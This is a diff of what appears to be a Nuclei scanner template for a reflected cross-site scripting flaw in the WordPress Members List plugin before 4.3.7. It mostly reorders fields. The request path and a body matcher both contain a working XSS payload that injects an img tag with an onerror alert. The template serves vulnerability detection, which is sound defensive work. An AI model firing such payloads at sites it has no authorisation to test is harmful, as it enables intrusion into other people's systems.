@@ -1,5 +1,4 @@
 id: members-list-xss
-
 info:
   name: WordPress Members List <4.3.7 - Cross-Site Scripting
   author: Akincibor
@@ -10,31 +9,26 @@ info:
   classification:
     cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N
     cvss-score: 5.4
-    cwe-id: CWE-80
+    cwe-id: CWE-79,CWE-80,CWE-83
   metadata:
     max-request: 1
-  tags: wp,wordpress,wp-plugin,xss,wpscan,vuln
-
+  tags: vuln,wordpress,wp,wp-plugin,wpscan,xss
 http:
-  - method: GET
-    path:
-      - '{{BaseURL}}/wp-content/plugins/members-list/admin/view/user.php?page=%22%3E%3Cimg%20src%20onerror=alert(document.domain)%20x'
-
-    matchers-condition: and
-    matchers:
-      - type: word
+  - matchers:
+      - condition: and
         part: body
+        type: word
         words:
           - '"><img src onerror=alert(document.domain) x'
-          - "wrap tern-wrap"
-        condition: and
-
-      - type: word
-        part: header
+          - wrap tern-wrap
+      - part: header
+        type: word
         words:
           - text/html
-
-      - type: status
-        status:
+      - status:
           - 200
-
+        type: status
+    matchers-condition: and
+    method: GET
+    path:
+      - '{{BaseURL}}/wp-content/plugins/members-list/admin/view/user.php?page=%22%3E%3Cimg%20src%20onerror=alert(document.domain)%20x'
